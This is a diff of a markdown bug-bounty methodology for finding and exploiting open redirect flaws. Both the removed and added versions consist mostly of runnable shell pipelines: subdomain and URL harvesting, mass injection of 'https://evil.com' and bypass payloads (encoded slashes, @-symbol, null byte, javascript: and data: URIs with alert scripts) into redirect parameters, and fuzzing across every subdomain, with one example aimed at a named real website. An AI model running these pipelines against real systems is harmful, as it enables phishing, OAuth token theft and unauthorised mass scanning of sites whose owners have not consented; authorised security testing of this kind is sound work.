@@ -1,164 +1,174 @@
-## Basic Open Redirect
 
-### Parameter Collection
+# Open Redirect Automation – Bug Bounty Methodology
 
-```bash
-gau target.com | uro | grep "=" > parameter.txt
-```
-or if you have parameter.txt file
-### Filter Redirect Parameters
+> **Private Bug Bounty Workflow**
+> End-to-end automation for discovering, validating, fuzzing, and escalating **Open Redirect** vulnerabilities.
 
-```bash
-grep -Ei "redirect|url|next|return|dest|continue|callback|goto|forward|out|view" parameter.txt > redirect_params.txt
-```
+## 1️⃣ Overview
 
-### Basic Payload Injection
+Open Redirect vulnerabilities can often be **chained** into higher-impact issues such as:
 
-```bash
-sed 's/=.*/=https:\/\/evil.com/' redirect_params.txt > basic_redirect.txt
-```
+* OAuth account takeover
+* Token leakage
+* Phishing
+* Client-side XSS (via `javascript:` or malformed schemes)
 
-### Automated Detection(Must use in ALL open redirect payloads to test)
-
-```bash
-httpx -l basic_redirect.txt -location -mc 301,302,307,308 -silent
-```
-use curl -I "URL_HERE" | grep -i location to check manually
-eg. curl -I "https://bmw.de/vc/ncc/xhtml/start/startWithConfigUrl.faces;jsessionid=https://evil.com"
+This methodology focuses on **automation-first discovery**, followed by **manual validation and escalation**.
 
 
-## Slash & Protocol Confusion Tricks
+## 2️⃣ Requirements
 
-### Protocol-Relative Redirect
+### 🔧 Core Tools
 
 ```bash
-sed 's/=.*/=\/\/evil.com/' redirect_params.txt > proto_relative.txt
+gau
+katana
+urlfinder
+hakrawler
+uro
+gf
+qsreplace
+httpx-toolkit
+subfinder
+ffuf
+nuclei
+curl
 ```
 
-### Triple Slash Redirect
+### 🔧 Optional Tools
 
 ```bash
-sed 's/=.*/=\/\/\/evil.com/' redirect_params.txt > triple_slash.txt
+Burp Suite
+Loxs
 ```
 
-### Mixed Slash Bypass
+## 3️⃣ URL Collection (Single Domain)
+
+Collect URLs from multiple sources to maximize coverage.
 
 ```bash
-sed 's/=.*/=https:\/\\\/evil.com/' redirect_params.txt > mixed_slash.txt
+echo target.com | gau > urls1.txt
+echo target.com | katana -d 2 > urls2.txt
+echo target.com | urlfinder -d target.com > urls3.txt
+echo target.com | hakrawler > urls4.txt
 ```
 
-## URL Encoding Tricks
+## 4️⃣ Merge, Normalize & Deduplicate URLs
 
-### Single URL Encoding
+Normalize parameters and remove duplicates.
 
 ```bash
-sed 's/=.*/=%2f%2fevil.com/' redirect_params.txt > encoded.txt
+cat urls1.txt urls2.txt urls3.txt urls4.txt | uro | sort -u > final.txt
 ```
 
-### Double URL Encoding
+## 5️⃣ Open Redirect Parameter Discovery
+
+### 🔍 Regex-Based Filtering
 
 ```bash
-sed 's/=.*/=%252f%252fevil.com/' redirect_params.txt > double_encoded.txt
+cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|desturl=|u=|location=" > redirect_params.txt
 ```
 
-## Domain Confusion Tricks
-
-### @ Symbol Bypass
+### ✅ GF Pattern (Recommended)
 
 ```bash
-sed 's/=.*/=https:\/\/target.com@evil.com/' redirect_params.txt > at_symbol.txt
+cat final.txt | gf redirect | uro | sort -u > redirect_params.txt
 ```
 
-### Subdomain Validation Bypass
+## 6️⃣ Basic Open Redirect Verification
+
+Replace parameters and confirm reflection in redirect response.
 
 ```bash
-sed 's/=.*/=https:\/\/evil.com.target.com/' redirect_params.txt > subdomain.txt
+cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
 ```
 
-## Path & Traversal Tricks
+## 7️⃣ Subdomain → URL → Redirect Scan (One-Liner)
 
-### Path Traversal Redirect
+Full pipeline from subdomain discovery to redirect detection.
 
 ```bash
-sed 's/=.*/=\/\/evil.com\/%2f..' redirect_params.txt > traversal.txt
+subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
 ```
 
-### Relative Path Abuse
+## 8️⃣ Bypass Payload Fuzzing (Custom Payload List)
+
+Test common bypass techniques using Loxs payloads.
 
 ```bash
-sed 's/=.*/=..\/..\/evil.com/' redirect_params.txt > relative_path.txt
+cat redirect_params.txt | while read url; do
+  cat loxs/payloads/or.txt | while read payload; do
+    echo "$url" | qsreplace "$payload"
+  done
+done | httpx-toolkit -silent -fr -mr "google.com"
 ```
-## Fragment & Parameter Pollution
 
-### Fragment Identifier Bypass
+## 9️⃣ Mass Bypass Fuzzing (Multiple Subdomains)
 
 ```bash
-sed 's/=.*/=#https:\/\/evil.com/' redirect_params.txt > fragment.txt
+subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro |
+while read url; do
+  cat loxs/payloads/or.txt | while read payload; do
+    echo "$url" | qsreplace "$payload"
+  done
+done | httpx-toolkit -silent -fr -mr "google.com"
 ```
 
-### Parameter Pollution
+## 🔟 FFUF Parameter + Payload Fuzzing (Burp Enabled)
+
+Useful for **manual review** and **Burp interception**.
 
 ```bash
-sed 's/=.*/=\/home&next=https:\/\/evil.com/' redirect_params.txt > pollution.txt
+ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD \
+-u "https://site.com/redirect.php?PARAM=PAYLOAD" \
+-mc 301,302,303,307,308 \
+-mr "Location: http://google.com" \
+-x http://127.0.0.1:8080 -t 10
 ```
 
-## Chained Redirect Attacks
+## 1️⃣1️⃣ CURL Mass Redirect Verification
 
-### Internal Redirect Chaining
+Lightweight confirmation of redirect behavior.
 
 ```bash
-sed 's/=.*/=\/redirect?url=https:\/\/evil.com/' redirect_params.txt > chained.txt
+cat redirect_params.txt | qsreplace "https://evil.com" | \
+xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\\n" {}
 ```
 
-## Scheme Abuse
+## 1️⃣2️⃣ Nuclei Open Redirect Scan
 
-### JavaScript Scheme Redirect
+Automated template-based detection.
 
 ```bash
-sed 's/=.*/=javascript:alert(1)/' redirect_params.txt > js_scheme.txt
+nuclei -l subdomains.txt -t openRedirect.yaml -c 30
 ```
 
-### Data URI Redirect
+## 1️⃣3️⃣ Parameter Extraction for Loxs
+
+Prepare clean parameter list for Loxs automation.
 
 ```bash
-sed 's/=.*/=data:text\/html,<script>alert(1)<\/script>/' redirect_params.txt > data_uri.txt
+cat redirect_params.txt | sed 's/=.*/=/' | uro > final_loxs.txt
 ```
 
-## Null Byte & Legacy Tricks
+## 1️⃣4️⃣ Open Redirect → XSS Impact Escalation
 
-### Null Byte Injection
+Test for client-side execution via dangerous schemes.
 
 ```bash
-sed 's/=.*/=https:\/\/evil.com%00.target.com/' redirect_params.txt > nullbyte.txt
+cat redirect_params.txt | qsreplace "javascript:alert(1)" | httpx-toolkit -silent -fr
 ```
 
-## Header-Based Redirects
+⚠️ **Note:** Many modern browsers mitigate this, but some legacy flows or mobile apps may still be affected.
 
-### Location Header Check
+
+## ⚡ 1️⃣5️⃣ Ultimate One-Command Pipeline
 
 ```bash
-curl -I "https://target.com/path?next=https://evil.com"
+subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro |
+while read url; do
+  cat loxs/payloads/or.txt | while read payload; do
+    echo "$url" | qsreplace "$payload"
+  done
+done | httpx-toolkit -silent -fr -mr "google.com"
 ```
-
-## OAuth Open Redirect (High Impact)
-
-### Filter OAuth Parameters
-
-```bash
-grep -Ei "redirect_uri|returnTo|callback|continue" parameter.txt > oauth_params.txt
-```
-
-### OAuth Payload Injection
-
-```bash
-sed 's/=.*/=https:\/\/evil.com/' oauth_params.txt > oauth_redirect.txt
-```
-
-## Path-Based Redirects (No parameter.txt)
-
-### Path Fuzzing
-
-```bash
-ffuf -u https://target.com/FUZZ -w redirect_paths.txt
-```
-
